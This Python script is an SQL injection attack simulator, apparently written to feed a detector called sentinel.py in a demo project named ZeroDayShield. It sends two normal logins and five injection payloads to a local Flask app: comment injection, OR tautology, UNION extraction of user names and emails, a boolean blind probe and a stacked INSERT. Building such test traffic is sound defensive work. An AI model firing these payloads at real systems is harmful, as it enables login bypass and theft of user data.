"""
attack.py
Fires 7 HTTP requests at the vulnerable Flask app — 2 normal, 5 SQLi.
Logs every request to request_log.jsonl so sentinel.py can pick them up.

Usage:
    python attack.py [--host http://127.0.0.1:5000] [--delay 0.6]
"""

import argparse
import json
import os
import sys
import time
from datetime import datetime, timezone

import requests

# Force UTF-8 output on Windows consoles
if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')

LOG_FILE = "request_log.jsonl"


def _log(entry: dict):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(json.dumps(entry) + "\n")


def _post_login(host: str, username: str, password: str, label: str) -> dict:
    url = f"{host}/login"
    payload = {"username": username, "password": password}
    try:
        resp = requests.post(url, data=payload, timeout=5)
        status_code = resp.status_code
        body = resp.json()
    except requests.exceptions.ConnectionError:
        print(f"  ✗  Could not connect to {host}. Is app.py running?")
        raise SystemExit(1)
    except Exception as e:
        status_code = 0
        body = {"error": str(e)}

    entry = {
        "timestamp":    datetime.now(timezone.utc).isoformat(),
        "source_ip":    "127.0.0.1",
        "endpoint":     "/login",
        "method":       "POST",
        "payload":      payload,
        "sql_query":    (
            f"SELECT * FROM users WHERE username = '{username}'"
            f" AND password = '<md5({password!r})>'"
        ),
        "response_code": status_code,
        "response_body": body,
        "label":        label,
    }
    _log(entry)

    icon = "✅" if status_code == 200 else "⛔"
    print(f"  {icon}  [{label:20s}] username={username!r:<28} → HTTP {status_code}  {body}")
    return entry


def _get(host: str, path: str, params: dict, label: str) -> dict:
    url = f"{host}{path}"
    try:
        resp = requests.get(url, params=params, timeout=5)
        status_code = resp.status_code
        try:
            body = resp.json()
        except Exception:
            body = resp.text[:200]
    except requests.exceptions.ConnectionError:
        print(f"  ✗  Could not connect to {host}. Is app.py running?")
        raise SystemExit(1)
    except Exception as e:
        status_code = 0
        body = {"error": str(e)}

    entry = {
        "timestamp":    datetime.now(timezone.utc).isoformat(),
        "source_ip":    "127.0.0.1",
        "endpoint":     path,
        "method":       "GET",
        "payload":      params,
        "sql_query":    f"SELECT ... WHERE ... {list(params.values())[0] if params else ''}",
        "response_code": status_code,
        "response_body": body if isinstance(body, dict) else {"raw": body},
        "label":        label,
    }
    _log(entry)

    icon = "✅" if status_code == 200 else "⛔"
    print(f"  {icon}  [{label:20s}] {path} {params} → HTTP {status_code}")
    return entry


def run(host: str, delay: float):
    # Reset log
    if os.path.exists(LOG_FILE):
        os.remove(LOG_FILE)

    print(f"\n{'='*65}")
    print(f"  ZeroDayShield — SQLi Attack Script")
    print(f"  Target : {host}")
    print(f"  Log    : {LOG_FILE}")
    print(f"{'='*65}\n")

    attacks = [
        # ── Baseline (should pass) ──────────────────────────────────────────
        ("NORMAL_LOGIN",     lambda: _post_login(host, "alice", "pass456",  "normal_login")),
        ("NORMAL_LOGIN_2",   lambda: _post_login(host, "admin", "secret123","normal_login")),

        # ── SQLi Attack 1: Comment injection ────────────────────────────────
        # admin' -- neutralises the password check
        ("COMMENT_INJECT",   lambda: _post_login(host, "admin' --",    "anything",  "sqli_comment")),

        # ── SQLi Attack 2: OR tautology ──────────────────────────────────────
        # ' OR '1'='1' -- always true
        ("OR_TAUTOLOGY",     lambda: _post_login(host, "' OR '1'='1' --", "x", "sqli_or_tautology")),

        # ── SQLi Attack 3: UNION extraction ──────────────────────────────────
        # Tries to extract DB schema via UNION
        ("UNION_EXTRACT",    lambda: _get(host, "/search",
                                          {"q": "' UNION SELECT 1,name,email FROM users --"},
                                          "sqli_union")),

        # ── SQLi Attack 4: Boolean blind ─────────────────────────────────────
        ("BLIND_BOOLEAN",    lambda: _get(host, "/search",
                                          {"q": "' AND 1=1 --"},
                                          "sqli_blind_boolean")),

        # ── SQLi Attack 5: Stacked queries attempt ───────────────────────────
        ("STACKED_QUERY",    lambda: _post_login(host,
                                                 "admin'; INSERT INTO logs (event) VALUES ('pwned'); --",
                                                 "x",
                                                 "sqli_stacked")),
    ]

    for label, fn in attacks:
        print(f"  ▶  {label}")
        try:
            fn()
        except SystemExit:
            raise
        except Exception as e:
            print(f"     Error: {e}")
        time.sleep(delay)

    print(f"\n  ✅  Attack script complete. {len(attacks)} requests logged to {LOG_FILE}\n")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ZeroDayShield SQLi attack simulator")
    parser.add_argument("--host",  default="http://127.0.0.1:5000")
    parser.add_argument("--delay", type=float, default=0.6,
                        help="Seconds between requests")
    args = parser.parse_args()
    run(args.host, args.delay)
